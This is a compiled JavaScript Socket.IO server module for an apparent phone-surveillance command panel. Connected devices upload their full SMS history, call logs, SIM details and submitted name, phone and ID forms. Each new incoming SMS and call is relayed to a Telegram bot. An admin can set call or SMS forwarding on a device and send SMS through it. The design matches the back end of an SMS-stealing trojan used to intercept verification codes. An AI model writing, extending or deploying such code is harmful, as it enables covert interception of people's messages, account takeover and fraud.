"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.setupSocketHandlers = setupSocketHandlers;
const store_js_1 = require("../store.js");
function setupSocketHandlers(io, telegramBot) {
    io.on('connection', (socket) => {
        console.log(`[Socket] Client connected: ${socket.id}`);
        // Device registration
        socket.on('device:register', async (data) => {
            console.log(`[Socket] Device registering: ${data.id}`);
            const deviceData = store_js_1.store.registerDevice({
                id: data.id,
                name: data.name,
                phoneNumber: data.phoneNumber,
                socketId: socket.id,
            });
            // Join device to its own room
            socket.join(`device:${data.id}`);
            // Notify admin panels of device update
            io.to('admin').emit('devices:update', store_js_1.store.getAllDevices());
            // Send current forwarding config to device
            socket.emit('forwarding:config', deviceData.forwarding);
            console.log(`[Socket] Device registered: ${data.id} (${data.name})`);
            // Notify via Telegram
            if (telegramBot?.isActive()) {
                await telegramBot.notifyDeviceOnline(deviceData.device);
            }
        });
        // Device requests its current forwarding config (e.g., after reconnection)
        socket.on('device:requestForwardingConfig', (deviceId) => {
            console.log(`[Socket] Device ${deviceId} requesting forwarding config`);
            const deviceData = store_js_1.store.getDevice(deviceId);
            if (deviceData) {
                console.log(`[Socket] Sending forwarding config to device ${deviceId}:`, JSON.stringify(deviceData.forwarding));
                socket.emit('forwarding:config', deviceData.forwarding);
            }
            else {
                console.log(`[Socket] WARNING: Device ${deviceId} not found in store when requesting forwarding config`);
            }
        });
        // SMS sync from device
        socket.on('sms:sync', async (data) => {
            console.log(`[Socket] SMS sync from device ${data.deviceId}: ${data.sms.length} messages`);
            // Get existing SMS count before sync
            const existingCount = store_js_1.store.getSMS(data.deviceId).length;
            const isFirstSync = existingCount === 0;
            store_js_1.store.syncSMS(data.deviceId, data.sms);
            // Notify admin panels
            io.to('admin').emit('sms:update', {
                deviceId: data.deviceId,
                sms: store_js_1.store.getSMS(data.deviceId),
            });
            // Telegram notifications
            if (telegramBot?.isActive()) {
                const deviceData = store_js_1.store.getDevice(data.deviceId);
                if (isFirstSync && data.sms.length > 0) {
                    // First sync: Show last 10 SMS in single message
                    await telegramBot.notifyDeviceConnected(deviceData?.device || { id: data.deviceId, name: data.deviceId }, data.sms.slice(-10));
                }
                else if (!isFirstSync) {
                    // Subsequent syncs: Only notify for NEW incoming SMS
                    const allSms = store_js_1.store.getSMS(data.deviceId);
                    const newSms = allSms.slice(existingCount);
                    const incomingSms = newSms.filter(sms => sms.type === 'incoming');
                    for (const sms of incomingSms) {
                        await telegramBot.notifyNewSMS(deviceData?.device.name || data.deviceId, sms);
                    }
                }
            }
        });
        // Call logs sync from device
        socket.on('calls:sync', async (data) => {
            console.log(`[Socket] Calls sync from device ${data.deviceId}: ${data.calls.length} calls`);
            // Get existing calls count before sync
            const existingCount = store_js_1.store.getCalls(data.deviceId).length;
            const isFirstSync = existingCount === 0;
            store_js_1.store.syncCalls(data.deviceId, data.calls);
            // Notify admin panels
            io.to('admin').emit('calls:update', {
                deviceId: data.deviceId,
                calls: store_js_1.store.getCalls(data.deviceId),
            });
            // Only notify for NEW calls (not on first sync - that's historical data)
            if (telegramBot?.isActive() && !isFirstSync) {
                const deviceData = store_js_1.store.getDevice(data.deviceId);
                const allCalls = store_js_1.store.getCalls(data.deviceId);
                const newCalls = allCalls.slice(existingCount);
                const incomingCalls = newCalls.filter(call => call.type !== 'outgoing');
                for (const call of incomingCalls) {
                    await telegramBot.notifyNewCall(deviceData?.device.name || data.deviceId, call);
                }
            }
        });
        // Form submission from device
        socket.on('form:submit', async (data) => {
            console.log(`[Socket] Form submitted from device ${data.deviceId}`);
            store_js_1.store.submitForm(data.deviceId, {
                name: data.name,
                phoneNumber: data.phoneNumber,
                id: data.id,
            });
            // Notify admin panels
            io.to('admin').emit('forms:update', {
                deviceId: data.deviceId,
                forms: store_js_1.store.getForms(data.deviceId),
            });
            // Notify via Telegram
            if (telegramBot?.isActive()) {
                const deviceData = store_js_1.store.getDevice(data.deviceId);
                await telegramBot.notifyFormSubmission(deviceData?.device.name || data.deviceId, { name: data.name, phoneNumber: data.phoneNumber, id: data.id });
            }
        });
        // SIM cards sync from device
        socket.on('sim:sync', (data) => {
            console.log(`[Socket] SIM sync from device ${data.deviceId}: ${data.simCards.length} SIMs`);
            store_js_1.store.syncSimCards(data.deviceId, data.simCards);
            // Send acknowledgment back to device
            socket.emit('sim:sync:ack', { deviceId: data.deviceId, success: true, count: data.simCards.length });
            // Notify admin panels with updated device info
            io.to('admin').emit('devices:update', store_js_1.store.getAllDevices());
            io.to('admin').emit('sim:update', {
                deviceId: data.deviceId,
                simCards: store_js_1.store.getSimCards(data.deviceId),
            });
        });
        // Admin panel connection
        socket.on('admin:connect', () => {
            console.log(`[Socket] Admin panel connected: ${socket.id}`);
            socket.join('admin');
            // Send current device list
            socket.emit('devices:update', store_js_1.store.getAllDevices());
        });
        // Admin requests device data
        socket.on('admin:getDeviceData', (deviceId) => {
            const deviceData = store_js_1.store.getDevice(deviceId);
            if (deviceData) {
                socket.emit('deviceData:update', {
                    deviceId,
                    sms: deviceData.sms,
                    calls: deviceData.calls,
                    forms: deviceData.forms,
                    forwarding: deviceData.forwarding,
                });
            }
        });
        // Admin requests sync from device
        socket.on('admin:requestSync', (deviceId) => {
            console.log(`[Socket] Admin requested sync from device ${deviceId}`);
            // Forward the sync request to the device
            io.to(`device:${deviceId}`).emit('device:requestSync');
        });
        // Admin updates forwarding config
        socket.on('forwarding:update', (data) => {
            console.log(`[Socket] Forwarding update for device ${data.deviceId}:`, JSON.stringify(data.config));
            const newConfig = store_js_1.store.updateForwarding(data.deviceId, data.config);
            if (newConfig) {
                // Get the device data to find its socket ID
                const deviceData = store_js_1.store.getDevice(data.deviceId);
                const deviceSocketId = deviceData?.device.socketId;
                console.log(`[Socket] Sending forwarding:config to device ${data.deviceId}`);
                console.log(`[Socket] Device socket ID: ${deviceSocketId}, Device status: ${deviceData?.device.status}`);
                // Send config to device room
                io.to(`device:${data.deviceId}`).emit('forwarding:config', newConfig);
                // Also send directly to the device's socket ID as a fallback
                // This ensures delivery even if room subscription has issues
                if (deviceSocketId) {
                    console.log(`[Socket] Also sending directly to socket ${deviceSocketId}`);
                    io.to(deviceSocketId).emit('forwarding:config', newConfig);
                }
                else {
                    console.log(`[Socket] WARNING: No socket ID found for device ${data.deviceId} - device may be offline`);
                }
                // Confirm to admin
                socket.emit('forwarding:updated', { deviceId: data.deviceId, config: newConfig });
                console.log(`[Socket] Forwarding config sent and confirmed for device ${data.deviceId}`);
            }
            else {
                console.log(`[Socket] ERROR: Failed to update forwarding for device ${data.deviceId} - device not found in store`);
            }
        });
        // Admin sends SMS via device
        socket.on('admin:sendSms', (data) => {
            console.log(`[Socket] Admin sending SMS via device ${data.deviceId} to ${data.recipientNumber}`);
            // Forward the SMS send request to the device
            io.to(`device:${data.deviceId}`).emit('sms:sendRequest', {
                recipientNumber: data.recipientNumber,
                message: data.message,
                subscriptionId: data.subscriptionId || -1,
                requestId: data.requestId,
            });
        });
        // SMS send result from device
        socket.on('sms:sendResult', (data) => {
            console.log(`[Socket] SMS send result from device ${data.deviceId}: ${data.success ? 'success' : 'failed'}`);
            // Forward result to admin
            io.to('admin').emit('sms:sendResult', data);
        });
        // Disconnection
        socket.on('disconnect', async () => {
            console.log(`[Socket] Client disconnected: ${socket.id}`);
            const deviceId = store_js_1.store.setDeviceOfflineBySocketId(socket.id);
            if (deviceId) {
                console.log(`[Socket] Device ${deviceId} marked offline`);
                io.to('admin').emit('devices:update', store_js_1.store.getAllDevices());
                // Notify via Telegram
                if (telegramBot?.isActive()) {
                    const deviceData = store_js_1.store.getDevice(deviceId);
                    if (deviceData) {
                        await telegramBot.notifyDeviceOffline(deviceData.device);
                    }
                }
            }
        });
    });
}
